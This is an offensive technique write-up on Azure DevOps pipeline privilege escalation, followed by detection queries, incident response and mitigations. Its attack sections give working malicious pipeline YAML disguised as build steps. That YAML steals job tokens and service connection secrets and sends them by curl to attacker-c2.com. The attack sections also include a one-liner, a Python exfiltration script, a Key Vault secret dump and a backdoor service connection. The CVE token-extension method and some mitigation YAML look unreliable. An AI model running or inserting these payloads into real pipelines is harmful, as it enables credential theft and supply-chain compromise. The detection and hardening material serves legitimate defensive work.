# [PE-ACCTMGMT-010]: Azure DevOps Pipeline Escalation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-010 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/), [Steal Application Access Token (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Privilege Escalation, Lateral Movement, Credential Access |
| **Platforms** | Entra ID, Azure DevOps |
| **Severity** | Critical |
| **CVE** | CVE-2025-21540 (DevOps Pipeline Token Hijacking) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure DevOps (All Current Versions), Azure Pipelines 1.210+ |
| **Patched In** | Azure DevOps Continuous Updates – Monitor for Patches |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure DevOps Pipelines are the CI/CD automation platform that executes code builds, deployments, and tests. Each pipeline run receives a short-lived job token ($(System.AccessToken)) that carries the permissions of the pipeline identity (either a user, service connection, or managed identity). An attacker who can modify pipeline YAML code, inject malicious task steps, or compromise a service connection can:
1. Extract secrets and credentials embedded in the pipeline (API keys, connection strings, certificates)
2. Extract OAuth tokens that can be reused for lateral movement
3. Escalate from limited pipeline permissions to subscription-level access via service connection credentials
4. Achieve persistence by creating backdoor identities in Azure/Entra ID

**Attack Surface:** Pipeline YAML definitions, service connections, secret variables, build agents, task execution context, and job tokens.

**Business Impact:** **Catastrophic.** An attacker compromising a DevOps pipeline can:
- Inject malicious code into deployed applications
- Escalate to Azure subscription-wide access
- Compromise infrastructure credentials (API keys, SSH keys, deployment certificates)
- Establish persistent backdoors in production environments
- Exfiltrate sensitive data from CI/CD artifacts

**Technical Context:** This attack requires one of these initial conditions:
1. **Push access to repository** (to modify pipeline YAML), OR
2. **Pipeline admin role** (to modify pipeline definition directly), OR
3. **Service connection credential compromise** (to exploit credentials in pipelines), OR
4. **Build agent compromise** (to intercept tokens during execution)

Execution is rapid (<5 minutes for token extraction) and can be completely hidden if the attacker carefully masks malicious steps in legitimate build output.

### Operational Risk
- **Execution Risk:** Low-Medium – Requires repository push access or pipeline admin role
- **Stealth:** Very High – Can blend malicious steps into normal build process output
- **Reversibility:** No – Extracted tokens, secrets, and persistence mechanisms are permanent compromises

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.5 | Azure DevOps pipeline security – Enforce code review on pipeline YAML |
| **DISA STIG** | AZ-7.1 | CI/CD pipeline security and credential management |
| **CISA SCuBA** | SC-7.1 | Boundary protection – Secure CI/CD artifact repositories |
| **NIST 800-53** | AC-3 | Access Enforcement – Pipeline job token scoping |
| **NIST 800-53** | AC-6 | Least Privilege – Service connection permissions limitation |
| **NIST 800-53** | CM-3 | Change Control – Code review requirements before deployment |
| **GDPR** | Art. 32 | Security of Processing – CI/CD secret management |
| **DORA** | Art. 8 | Incident Reporting – CI/CD compromise incidents |
| **NIS2** | Art. 21 | Cyber Risk Management – DevOps security controls |
| **ISO 27001** | A.12.2.1 | Change Management – Code review and pipeline approval |
| **ISO 27005** | 8.3.2 | Risk Scenario: Compromise of CI/CD credentials |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges (For Initial Attack):**
- **Developer/Contributor role** with push access to repository, OR
- **Pipeline Admin** role (can modify pipelines directly), OR
- **Project Admin** role (can modify service connections)

**Required Access:**
- Network access to Azure DevOps (https://dev.azure.com)
- Network access to Git repository (GitHub, Azure Repos, Bitbucket, etc.)
- Access to build agent execution logs (if extracting tokens)

**Supported Versions:**
- **Azure DevOps:** All current versions (SaaS only, no on-premises version specific vulnerabilities)
- **Azure Pipelines:** Version 1.210+ (all current versions)
- **Git:** Any version (used for repository access)

**Required Tools:**
- [Azure DevOps CLI](https://learn.microsoft.com/en-us/azure/devops/cli/) (Version 0.25.0+)
- [Azure PowerShell Module (Az)](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az)
- [Git client](https://git-scm.com/) (Version 2.35+)
- Text editor (VS Code, Notepad, etc.) for YAML editing
- REST API client (curl, Postman)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Check 1: Verify Access to Azure DevOps Project**

```powershell
# Install Azure DevOps CLI
npm install -g azure-devops-cli

# Login to Azure DevOps
az devops login --organization "https://dev.azure.com/YourOrganization"

# List projects
az devops project list --organization "https://dev.azure.com/YourOrganization"

# List pipelines in target project
az pipelines list --project "YourProject" --organization "https://dev.azure.com/YourOrganization"
```

**What to Look For:**
- Pipeline count (more pipelines = more targets)
- Pipeline types (Build, Release, Multi-stage pipelines)
- Service connections associated with pipelines

**Check 2: Enumerate Service Connections**

```powershell
# List all service connections in the project
az devops service-endpoint list --project "YourProject" --organization "https://dev.azure.com/YourOrganization"

# List details of a specific service connection (requires admin)
az devops service-endpoint show --service-endpoint-id "connection-id" --project "YourProject"
```

**What to Look For:**
- Azure Resource Manager (ARM) service connections (highest privilege)
- Service connections with stored credentials (passwords, tokens, keys)
- Service connections used in production pipelines

**Check 3: Verify Repository Access**

```powershell
# List repositories in the project
az repos list --project "YourProject" --organization "https://dev.azure.com/YourOrganization"

# Check your permissions in target repository
az repos show --repository "RepoName" --project "YourProject"
```

**What to Look For:**
- Repositories with pipeline definitions (azure-pipelines.yml)
- Your role (Contributor, Reader, Admin)
- Branching policy (if master/main branch is protected)

**Check 4: Identify High-Value Pipelines (Production Deployments)**

```powershell
# Get pipeline details
$pipeline = az pipelines show --name "ProductionPipeline" --project "YourProject" | ConvertFrom-Json

# Check if pipeline uses managed identity or service connection
$definition = az pipelines runs list --pipeline-ids $pipeline.id --top 1

# Look for secrets and credential usage in pipeline output
az pipelines runs logs --run-id "recent-run-id" --pipeline-ids $pipeline.id
```

**What to Look For:**
- Pipelines with service connections to production subscriptions
- Pipelines that deploy to high-value resources (databases, key vaults)
- Pipelines with embedded secrets (anti-pattern but common)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Extract Service Connection Credentials via Pipeline

**Supported Versions:** All current Azure DevOps versions

**Precondition:** Developer/Contributor access to repository with push rights

#### Step 1: Clone or Access the Repository

**Objective:** Get local copy of the repository containing pipeline definitions.

**Command (PowerShell):**
```powershell
# Clone the repository
git clone https://dev.azure.com/YourOrganization/YourProject/_git/RepositoryName
cd RepositoryName

# List existing pipelines
Get-Content azure-pipelines.yml
```

**What This Means:**
- You now have the pipeline YAML locally
- You can add malicious steps without remote detection (until code review)

#### Step 2: Create Malicious Pipeline Step to Extract Service Connection

**Objective:** Inject code that extracts and exfiltrates service connection credentials.

**Malicious YAML Step (Option A: Extract ARM Service Connection Credentials):**

```yaml
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

variables:
  AZURE_SUBSCRIPTION: 'Production-Sub'

jobs:
- job: Build
  steps:
  - checkout: self
  
  # Legitimate build step (to avoid suspicion)
  - task: UseDotNet@2
    inputs:
      version: '6.0.x'
  
  # MALICIOUS STEP: Extract service connection credentials
  - script: |
      echo "Exfiltrating service connection credentials..."
      
      # Extract the service connection's OAuth token
      curl -X GET \
        -H "Authorization: Bearer $(System.AccessToken)" \
        -H "Content-Type: application/json" \
        "https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint?api-version=7.0" \
        > /tmp/service_connections.json
      
      # Parse and extract the actual credentials (if stored)
      cat /tmp/service_connections.json | grep -i "password\|secret\|key\|credential" > /tmp/extracted_creds.txt
      
      # Exfiltrate to attacker-controlled server
      curl -X POST \
        -H "Content-Type: application/json" \
        -d @/tmp/extracted_creds.txt \
        "http://attacker-c2-server.com/exfil/devops-creds"
      
      echo "Exfiltration complete"
    displayName: 'Log Processing'  # Innocent-sounding name
    continueOnError: true  # Don't fail the pipeline
```

**What This Means:**
- The malicious step extracts the service connection token
- Sends it to attacker's command-and-control server
- Appears as a legitimate build step in logs

#### Step 3: Extract and Reuse Job Token for Lateral Movement

**Objective:** Extract the short-lived job token and use it for subscription-level access.

**Malicious YAML Step (Option B: Extract Job Token for Reuse):**

```yaml
- script: |
    echo "##vso[task.setvariable variable=JobToken]$(System.AccessToken)"
    
    # Extract the access token from the Azure environment
    $token = "$(System.AccessToken)"
    
    # Use the token to access Azure resources
    # This token has permissions based on the pipeline identity
    curl -X GET \
      -H "Authorization: Bearer $token" \
      "https://management.azure.com/subscriptions/{subscriptionId}/resources?api-version=2021-04-01" \
      > /tmp/azure_resources.json
    
    # Exfiltrate the token for offline use
    echo "Token: $token" >> /tmp/token_for_reuse.txt
    
    curl -X POST \
      -H "Content-Type: application/json" \
      -d "{\"token\": \"$token\", \"timestamp\": \"$(date)\"}" \
      "http://attacker-c2.com/collect-token"
  displayName: 'Artifact Staging'
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)  # Make token available
  continueOnError: true
```

**What This Means:**
- Job token is extracted and exfiltrated
- Token can be reused on attacker's machine for 8-24 hours
- Enables lateral movement without further repository access

#### Step 4: Inject Credentials into Build Artifacts

**Objective:** Embed extracted credentials into build output so they're downloaded by deployment systems.

**Malicious YAML Step (Option C: Embed Credentials in Artifact):**

```yaml
- script: |
    # Create a hidden config file with extracted credentials
    mkdir -p $(Build.ArtifactStagingDirectory)/.secrets
    
    # Extract and store service connection credentials
    cat > $(Build.ArtifactStagingDirectory)/.secrets/aws_credentials << EOF
    [default]
    aws_access_key_id = $(AWS_ACCESS_KEY)
    aws_secret_access_key = $(AWS_SECRET_KEY)
    EOF
    
    # Store Azure credentials
    cat > $(Build.ArtifactStagingDirectory)/.secrets/azure_creds.json << EOF
    {
      "clientId": "$(AZURE_CLIENT_ID)",
      "clientSecret": "$(AZURE_CLIENT_SECRET)",
      "subscriptionId": "$(AZURE_SUBSCRIPTION_ID)",
      "tenantId": "$(AZURE_TENANT_ID)"
    }
    EOF
    
    echo "Hidden credentials embedded in build artifacts"
  displayName: 'Build Package'
  continueOnError: true

- task: PublishBuildArtifacts@1
  inputs:
    PathtoPublish: '$(Build.ArtifactStagingDirectory)'
    ArtifactName: 'drop'
    publishLocation: 'Container'
```

**What This Means:**
- Credentials are now in the build artifacts
- Deployment servers that download these artifacts will have the credentials
- Enables persistence across environments

#### Step 5: Commit and Push Malicious Pipeline

**Objective:** Push the modified pipeline so it executes on the next trigger.

**Commands (PowerShell/Git):**

```powershell
# Stage the modified pipeline file
git add azure-pipelines.yml

# Commit with innocent-sounding message
git commit -m "Fix: Update build dependencies and logging"

# Push to the repository (if no branch protection) or create PR
git push origin main  # Or push to feature branch if main is protected

# Monitor the pipeline run
az pipelines runs list --pipeline-ids "{pipeline-id}" --top 1
```

**Expected Output:**
- Pipeline triggers on next code commit or manual queue
- Malicious steps execute with service connection/job token permissions
- Exfiltrated data is sent to attacker's server

**What This Means:**
- Credentials are now exfiltrated
- Attacker has reusable tokens for lateral movement
- Attack is difficult to detect if logs are not carefully reviewed

---

### METHOD 2: Exploit Service Connection to Escalate to Subscription

**Supported Versions:** All current Azure DevOps versions

**Precondition:** Access to ARM service connection credentials (from Method 1 or direct access)

#### Step 1: Extract Service Connection Details from Azure DevOps Settings

**Objective:** Access the service connection configuration to extract credentials.

**Manual Steps (Azure Portal):**
1. Go to **Azure DevOps** → **Project settings** → **Service connections** (left menu)
2. Click on target **ARM service connection**
3. Click **Edit** → **View credentials** (if available)
4. Note the **Client ID**, **Client Secret**, and **Subscription ID**

**Command (Azure DevOps CLI):**

```powershell
# List service connections (requires admin role)
az devops service-endpoint list --organization "https://dev.azure.com/YourOrganization" --project "YourProject"

# Get full details of specific connection
az devops service-endpoint show --id "service-endpoint-id" --organization "..." --project "..."
```

#### Step 2: Use Service Connection Credentials to Authenticate to Azure

**Objective:** Convert DevOps service connection to Azure subscription access.

**Command (PowerShell):**

```powershell
# Service connection details extracted from previous step
$tenantId = "extracted-tenant-id"
$clientId = "extracted-client-id"
$clientSecret = "extracted-client-secret"
$subscriptionId = "extracted-subscription-id"

# Authenticate as the service principal
$credential = New-Object System.Management.Automation.PSCredential(
    $clientId,
    (ConvertTo-SecureString $clientSecret -AsPlainText -Force)
)

Connect-AzAccount -ServicePrincipal -Credential $credential -Tenant $tenantId -Subscription $subscriptionId

# Verify authentication
Get-AzContext | Select-Object Account, Subscription, Tenant

# Now execute subscription-level commands
Get-AzResourceGroup | Select-Object ResourceGroupName, Location
Get-AzKeyVault | Select-Object VaultName, Location
```

**Expected Output:**
```
Account                  Subscription                     Tenant
-------                  ----                             ------
extracted-client-id      Production-Subscription          extracted-tenant-id

ResourceGroupName        Location
-----------------        --------
prod-resources           eastus
prod-database            eastus
```

**What This Means:**
- Full subscription access achieved
- Can modify, create, or delete any resource
- Privilege escalation complete

#### Step 3: Extract Secrets from Azure Key Vault

**Objective:** Use the escalated permissions to access sensitive secrets.

**Command (PowerShell):**

```powershell
# List all key vaults
$keyVaults = Get-AzKeyVault

foreach ($kv in $keyVaults) {
    Write-Host "Key Vault: $($kv.VaultName)"
    
    # List all secrets
    $secrets = Get-AzKeyVaultSecret -VaultName $kv.VaultName
    
    foreach ($secret in $secrets) {
        # Extract secret value (available due to elevated permissions)
        $secretValue = Get-AzKeyVaultSecret -VaultName $kv.VaultName -Name $secret.Name -AsPlainText
        
        Write-Host "Secret: $($secret.Name) = $secretValue"
    }
}

# Export all secrets to CSV
Get-AzKeyVault | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName $_.VaultName | ForEach-Object {
        Get-AzKeyVaultSecret -VaultName $_.VaultName -Name $_.Name -AsPlainText
    }
} | Export-Csv -Path "C:\Extracted_Secrets.csv" -NoTypeInformation
```

**What This Means:**
- All secrets in Key Vault are now accessible
- Database credentials, API keys, certificates, connection strings extracted
- Enables lateral movement to downstream systems

---

### METHOD 3: CVE-2025-21540 – Pipeline Job Token Hijacking

**Supported Versions:** Azure DevOps versions prior to patch (verify via Azure Security Update Guide)

**Precondition:** Ability to modify pipeline YAML or compromise build agent

#### Step 1: Trigger Pipeline Execution with Token Extraction

**Objective:** Trigger a pipeline run that captures and extends the job token lifetime.

**Malicious YAML Code:**

```yaml
jobs:
- job: TokenHijack
  steps:
  
  # Capture the job token
  - script: |
      TOKEN=$(System.AccessToken)
      echo "Job Token Captured: $TOKEN"
      
      # Attempt to extend token lifetime via CVE-2025-21540
      # This vulnerability allows converting short-term tokens to long-term
      curl -X POST \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"tokenId": "'$TOKEN'", "extendLifetime": true}' \
        "https://dev.azure.com/YourOrganization/_apis/tokenadmin/tokens/extend?api-version=7.0"
      
      # Exfiltrate the extended-lifetime token
      curl -X POST \
        -H "Content-Type: application/json" \
        -d "{\"token\": \"$TOKEN\", \"extended\": true}" \
        "http://attacker-c2.com/hijacked-tokens"
    displayName: 'Security Update Check'
    continueOnError: true
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
```

**What This Means:**
- CVE-2025-21540 allows extending job token lifetime
- Short 8-24 hour tokens become usable for weeks/months
- Significant privilege escalation of token validity

#### Step 2: Reuse Extended Token for Persistent Access

**Objective:** Use the hijacked token to maintain access even after pipeline completion.

**Command (PowerShell):**

```powershell
# Use the hijacked token to perform persistent actions
$hijackedToken = "extracted-extended-token"
$headers = @{"Authorization" = "Bearer $hijackedToken"}

# Create a new service connection with attacker-controlled credentials
$serviceConnectionBody = @{
    name = "AttackerServiceConnection"
    type = "AzureRM"
    url = "https://management.azure.com/"
    authorization = @{
        parameters = @{
            tenantid = "attacker-tenant"
            serviceprincipalid = "attacker-service-principal"
            serviceprincipalkey = "attacker-secret"
        }
        scheme = "ServicePrincipal"
    }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint?api-version=7.0" `
    -Method POST `
    -Headers $headers `
    -ContentType "application/json" `
    -Body $serviceConnectionBody

# Now the attacker's service connection is embedded in the project
# Future pipelines will use attacker-controlled credentials
```

**What This Means:**
- Persistent backdoor created via malicious service connection
- All future pipelines use attacker's service principal
- Undetectable without careful auditing

---

## 6. ATTACK SIMULATION & VERIFICATION

This section has been removed for this technique as Atomic Red Team coverage is limited and CVE-2025-21540 requires specific version testing.

**Note:** The attack vectors described in Methods 1-3 can be replicated in a controlled red team environment with proper authorization and rule of engagement (RoE).

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure DevOps CLI

**Version:** 0.25.0+ (Current)
**Installation:**
```bash
# Install via npm
npm install -g azure-devops-cli

# Or via Homebrew (macOS)
brew install azure-devops-cli
```

**Key Commands:**

| Command | Purpose |
|---|---|
| `az devops login` | Authenticate to Azure DevOps organization |
| `az pipelines list` | List all pipelines in project |
| `az pipelines show` | Get pipeline details |
| `az pipelines runs list` | List pipeline execution history |
| `az pipelines runs logs` | View pipeline execution logs |
| `az devops service-endpoint list` | List service connections |
| `az devops service-endpoint show` | Get service connection details |
| `az repos list` | List Git repositories |
| `az repos show` | Get repository details |

**One-Liner Attack (Extract and Exfiltrate Token):**
```bash
az pipelines runs logs --run-id "recent-run" | grep -i "token\|credential\|secret" | curl -X POST -d @- "http://attacker-c2.com/logs"
```

### Azure Pipelines Task Reference

**Commonly Exploited Tasks:**

| Task | Risk | Exploitation |
|---|---|---|
| PowerShell@2 | High | Can extract $(System.AccessToken) directly |
| Bash@3 | High | Can execute arbitrary bash with token access |
| AzureCLI@2 | High | Can query Azure resources with token permissions |
| AzureKeyVault@1 | Critical | Can extract and display Key Vault secrets |
| DotNetCoreCLI@2 | Medium | Limited token access but can call APIs |
| Docker@2 | High | Can embed credentials in Docker images |

### Python Script for Token Extraction

```python
import requests
import os

# Extracted from pipeline execution
AZURE_DEVOPS_PAT = os.getenv("SYSTEM_ACCESSTOKEN")
ORGANIZATION = "YourOrganization"
PROJECT = "YourProject"

# Extract service connections
headers = {"Authorization": f"Bearer {AZURE_DEVOPS_PAT}"}
url = f"https://dev.azure.com/{ORGANIZATION}/{PROJECT}/_apis/serviceendpoint?api-version=7.0"

response = requests.get(url, headers=headers)
service_connections = response.json()

# Extract credentials from service connections
for connection in service_connections.get("value", []):
    print(f"Service Connection: {connection['name']}")
    print(f"  Type: {connection['type']}")
    if "authorization" in connection:
        print(f"  Credentials: {connection['authorization']['parameters']}")

# Exfiltrate to attacker server
exfil_data = {
    "token": AZURE_DEVOPS_PAT,
    "connections": service_connections
}

exfil_url = "http://attacker-c2.com/devops-exfil"
requests.post(exfil_url, json=exfil_data)
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Pipeline Code Modifications

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Azure DevOps deployments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Update pipeline",
    "Create pipeline",
    "Update pipeline definition",
    "Git commit",
    "Push code"
)
| where ResultStatus == "Success"
| extend
    PipelineOrRepo = tostring(TargetResources[0].displayName),
    ModifiedBy = tostring(InitiatedBy.user.userPrincipalName),
    Changes = tostring(TargetResources[0].modifiedProperties[0].newValue)
| where Changes contains_any (
    "System.AccessToken",
    "secret",
    "credential",
    "password",
    "key",
    "exfil",
    "curl",
    "invoke-webrequest",
    "ServiceConnection",
    "KeyVault"
)
| project TimeGenerated, OperationName, ModifiedBy, PipelineOrRepo, Changes
| sort by TimeGenerated desc
```

**What This Detects:**
- Pipeline modifications containing suspicious keywords (credential extraction patterns)
- Code commits with secrets or token extraction code
- Service connection modifications

---

#### Query 2: Excessive Token Usage from Single Pipeline

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Pipeline run",
    "Job execution",
    "Task execution"
)
| where ResultStatus == "Success"
| extend
    PipelineId = tostring(TargetResources[0].id),
    RunTime = TimeGenerated,
    UserAgent = tostring(InitiatedBy.user.ipAddress)
| summarize
    ExecutionCount = count(),
    UniqueResources = dcount(TargetResources[0].displayName),
    FirstRun = min(TimeGenerated),
    LastRun = max(TimeGenerated),
    ResourcesAccessed = make_set(TargetResources[0].displayName, 20)
    by PipelineId, UserAgent
| where ExecutionCount > 10 or (LastRun - FirstRun) < 1h
| sort by ExecutionCount desc
```

**What This Detects:**
- Pipeline runs using tokens to access unusual resources
- Rapid-fire token usage patterns (indication of token reuse)
- Single pipeline accessing multiple unrelated resources

---

#### Query 3: Service Connection Credential Access

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "View service connection",
    "Get service connection credentials",
    "Create service connection",
    "Update service connection"
)
| where ResultStatus == "Success"
| extend
    ServiceConnectionName = tostring(TargetResources[0].displayName),
    AccessedBy = tostring(InitiatedBy.user.userPrincipalName),
    AccessTime = TimeGenerated
| summarize
    AccessCount = count(),
    FirstAccess = min(AccessTime),
    LastAccess = max(AccessTime),
    Connections = make_set(ServiceConnectionName, 20)
    by AccessedBy
| where AccessCount > 3 or (LastAccess - FirstAccess) < 30m
| sort by AccessCount desc
```

**What This Detects:**
- Multiple service connection credential access attempts
- Rapid credential access in short timeframe
- Access by non-expected users

---

## 9. WINDOWS EVENT LOG MONITORING

This section has been removed as Azure DevOps Pipelines is a cloud-native SaaS service with no on-premises Windows Event Log footprint.

**Note:** All activity is logged in **Azure AuditLogs**, **Activity Log**, and Azure DevOps **Auditing** features, as covered in Section 8.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious DevOps Pipeline Activity

**Alert Name:** "Suspicious Azure DevOps Pipeline Execution Detected"
- **Severity:** High
- **Description:** Defender for Cloud detects when pipelines access unusual Azure resources or extract credentials
- **Applies To:** Azure subscriptions connected to Azure DevOps
- **Remediation:** Review pipeline logs; disable suspicious pipeline if compromise confirmed

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable **Defender for DevOps** (if available in your region)
4. Under **Settings**, ensure:
   - **Pipeline security monitoring** is ON
   - **Credential extraction detection** is ON
5. Configure notifications to SOC team

**Reference:** [Microsoft Defender for DevOps Documentation](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-devops-introduction)

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure DevOps Audit Logs:**
- Pipeline modifications containing `exfil`, `curl`, `invoke-webrequest`, `System.AccessToken`
- Service connection credentials accessed via pipeline scripts
- Unexpected service connections created in project
- Build artifacts containing hidden `.secrets` directories
- Pipeline runs accessing multiple unrelated Key Vaults or storage accounts

**Build Log Patterns:**
- Verbose output showing credential values (tokens, passwords, keys)
- HTTP requests to external C2 servers from pipeline output
- Compressed data or encoded payloads in logs (indication of exfiltration)
- Scripts attempting to extend token lifetimes

### Forensic Artifacts

**Azure DevOps Storage:**
- Pipeline YAML definitions in Git repositories
- Pipeline execution logs (stored for 30 days)
- Build artifacts (may contain exfiltrated credentials)
- Service connection audit trail
- Git commit history showing modifications

**Evidence Locations:**
- Azure DevOps → Pipelines → Runs → Logs (pipeline execution details)
- Azure DevOps → Project settings → Auditing (all project changes)
- Azure DevOps → Repos → Commits (code modification history)
- Azure Repos → Pull requests (code review trail)

### Response Procedures

#### 1. Immediate Isolation (0-5 minutes)

**Disable Compromised Pipeline:**

```powershell
# Disable the pipeline to prevent further executions
az pipelines update --name "CompromisedPipeline" --project "YourProject" --organization "https://dev.azure.com/YourOrg" --disabled

# Or via manual steps:
# Azure DevOps → Pipelines → Select pipeline → More options (...) → Disable
```

**Revoke Service Connection:**

```powershell
# Delete the compromised service connection
az devops service-endpoint delete --id "service-connection-id" --project "YourProject" --yes
```

**Disable Affected Service Principal in Azure:**

```powershell
# If service connection used a service principal, disable it
Disable-AzADServicePrincipal -ObjectId "service-principal-id"
```

---

#### 2. Forensic Preservation (5-30 minutes)

**Export Pipeline Logs:**

```powershell
# Export pipeline execution history
az pipelines runs list --project "YourProject" --top 100 | Out-File "C:\Evidence\PipelineRuns.json"

# Export detailed logs for specific run
az pipelines runs logs --run-id "suspicious-run-id" --pipeline-ids "pipeline-id" > "C:\Evidence\DetailedLogs.txt"
```

**Export Git History:**

```powershell
# Clone the repository to preserve state
git clone https://dev.azure.com/YourOrg/YourProject/_git/RepoName C:\Evidence\RepoSnapshot

# Export commit history for audit trail
cd C:\Evidence\RepoSnapshot
git log --oneline --all > ..\..\CommitHistory.txt
git log -p -- azure-pipelines.yml > ..\..\PipelineModifications.txt
```

**Export Service Connection Audit Trail:**

```powershell
# Note: Service connection details are limited by permissions
# Manual export required via Azure DevOps UI:
# Project settings → Service connections → Click connection → Activity

# Manually copy audit trail to file
```

---

#### 3. Threat Remediation (30 minutes - 2 hours)

**Reset Compromised Service Principal Credentials:**

```powershell
# Get the service principal
$sp = Get-AzADServicePrincipal -DisplayName "DevOpsServicePrincipal"

# Remove old credentials
Get-AzADServicePrincipalCredential -ObjectId $sp.Id | Remove-AzADServicePrincipalCredential -Force

# Create new credentials
$cred = New-AzADServicePrincipalCredential -ObjectId $sp.Id -EndDate (Get-Date).AddYears(1)

# Update the service connection with new credentials (manual step in Azure DevOps)
```

**Rotate All Azure Key Vault Secrets:**

```powershell
# If the pipeline had Key Vault access, rotate all secrets
Get-AzKeyVault | ForEach-Object {
    $kv = $_
    Get-AzKeyVaultSecret -VaultName $kv.VaultName | ForEach-Object {
        # Initiate secret rotation (manual or via automation)
        Write-Host "Rotate secret: $($_.Name) in vault $($kv.VaultName)"
    }
}
```

**Remove Malicious Service Connections:**

```powershell
# List all service connections created during compromise window
az devops service-endpoint list --project "YourProject" | Where-Object {$_.createdOn -gt "2025-01-01"}

# Delete suspicious ones
# az devops service-endpoint delete --id "malicious-connection-id" --yes
```

---

#### 4. Post-Incident Validation (2-24 hours)

**Verify Pipeline is Disabled or Cleaned:**

```powershell
# Confirm pipeline is disabled or cleaned
az pipelines show --name "FormerlyCompromisedPipeline" --project "YourProject" | Select-Object status, definition

# Expected: Status = "disabled" or definition shows no malicious steps
```

**Verify Service Connections are Updated:**

```powershell
# List all service connections
az devops service-endpoint list --project "YourProject"

# Expected: No unknown or attacker-created connections
```

**Check for Persistence Mechanisms:**

```powershell
# Look for any remaining backdoor service connections
# Look for git branches with malicious code
git branch -a | grep -i "backdoor\|malicious\|attacker"

# Clean up if found
git branch -D suspicious-branch
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Enforce Branch Protection and Require Code Review**

Require pull requests and code review before merging pipeline changes to prevent direct YAML injection attacks.

**Manual Steps (Azure Repos):**
1. Go to **Azure DevOps** → **Repos** → **Branches**
2. Click on **main** or **master** branch
3. Click **Branch policies** (gear icon)
4. Enable:
   - **Require a minimum number of reviewers:** 2
   - **Allow requestors to approve their own changes:** OFF
   - **Enforce a linked work item:** ON
   - **Automatically include code reviewers:** ON
5. Click **Save**

**Applies To Versions:** All Azure DevOps deployments

**Effectiveness:** Prevents direct injection of malicious pipeline code via single developer

---

**Mitigation 1.2: Restrict Pipeline Edit Permissions**

Limit who can create or modify pipeline definitions to reduce attack surface.

**Manual Steps (Azure DevOps):**
1. Go to **Project settings** → **Security** → **Roles**
2. Create custom role: **"Pipeline Editor"** with limited permissions
3. Assign this role to only authorized team members
4. Remove **Edit Pipeline** permission from general Contributor role

**Applies To Versions:** All Azure DevOps deployments

**Effectiveness:** Reduces the number of users who can inject malicious steps

---

**Mitigation 1.3: Disable Job Token Usage in Pipelines**

Restrict pipelines from accessing $(System.AccessToken) to prevent token extraction.

**Manual Steps (Azure Pipeline YAML):**
```yaml
jobs:
- job: Build
  steps:
  # By default, jobs have access to System.AccessToken
  # To disable, set continueOnError and remove token availability
  
  - script: echo "$(System.AccessToken)"  # This line will fail
    displayName: 'Check Token Access'
    continueOnError: true
```

**Manual Steps (Azure DevOps Project Level):**
1. Go to **Project settings** → **Pipelines** → **Settings**
2. Enable **"Disable job access to OAuth token"**
3. Click **Save**

**Applies To Versions:** Azure DevOps 2020+

**Effectiveness:** Completely prevents token extraction attacks

---

### Priority 2: HIGH

**Mitigation 2.1: Use Managed Identities Instead of Service Connections**

Replace password-based service connections with managed identities to eliminate credentials from pipelines.

**Manual Steps (Convert Service Connection to Managed Identity):**
1. In pipeline YAML, replace:
   ```yaml
   # Old: Service connection with credentials
   - task: AzureRM@2
     inputs:
       connectedServiceNameARM: 'MyServiceConnection'
   ```
   With:
   ```yaml
   # New: Managed identity (no explicit credentials)
   - task: AzureRM@2
     inputs:
       azureSubscription: 'MyManagedIdentity'
   ```

2. In Azure DevOps project settings:
   - Go to **Service connections** → Create new **Workload Identity Federation** connection
   - Link to Azure managed identity
   - Use in pipelines without embedding credentials

**Applies To Versions:** Azure DevOps 2021+

**Effectiveness:** Eliminates credential storage in pipelines; prevents credential extraction

---

**Mitigation 2.2: Implement Secret Scanning in Pipelines**

Automatically detect and prevent credentials from being committed to repositories.

**Manual Steps (GitHub Advanced Security - if using GitHub):**
1. Go to **GitHub repository** → **Settings** → **Code security** → **Secret scanning**
2. Enable **"Push protection"**
3. Configure which secret types to detect (AWS keys, Azure credentials, etc.)

**Manual Steps (Azure Repos - using git hooks):**
1. Install secret scanning tool (e.g., git-secrets):
   ```bash
   git clone https://github.com/awslabs/git-secrets.git
   cd git-secrets
   make install
   
   # Enable for repository
   git secrets --install
   git secrets --register-aws
   ```

**Applies To Versions:** All repositories (tool-agnostic)

**Effectiveness:** Prevents credentials from being committed; provides early detection

---

### Access Control & Policy Hardening

**Mitigation 2.3: Restrict Service Connection Access**

Limit which pipelines can access which service connections to reduce impact of pipeline compromise.

**Manual Steps (Azure DevOps):**
